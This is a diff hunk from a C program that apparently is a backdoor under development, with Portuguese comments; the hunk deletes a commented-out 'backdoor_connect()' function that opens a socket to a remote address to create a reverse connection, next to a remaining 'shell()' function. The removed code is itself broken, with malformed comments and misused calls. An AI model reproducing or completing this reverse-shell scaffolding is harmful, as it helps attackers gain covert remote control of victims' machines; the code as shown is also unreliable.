@@ -182,41 +182,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     return;
 }
-   /* void
-    backdoor_connect()
-
-    {
-
-    int x;
-    struct sockaddr_in s;
-     setting up the connection
-
-     memset(s.sin_zero, '\0', sizeof s.sin_zero);
-     s.sin_family = AF_INET;  família de protocolos
-     s.sin_addr.s_addr = inet_addr(remote_addr);
-     s.sin_port = htons(remote_port);
-     malloc(sizeof (x));
-
-     x = socket(AF_INET, SOCK_STREAM, 0); /create a socket
-     //while (connect == false)
-     //listen(x,10);
-
-    / sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
-                   discomment this if u think necessary...
-     (connect(x, (struct sockaddr *)&s, sizeof(s)));
-     if (accept == -1)
-     perror("socket(SOCKET_CONNECT)connect_failed");
-
-     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
-     perror("setsockopt(SO_REUSEADDR)failed");
-
-     return;
-
-     //listen(x,10);
-
-  /função para o programa rodar em background, como uma daemon
-   create reverse connection */
-
   void
   shell()
 
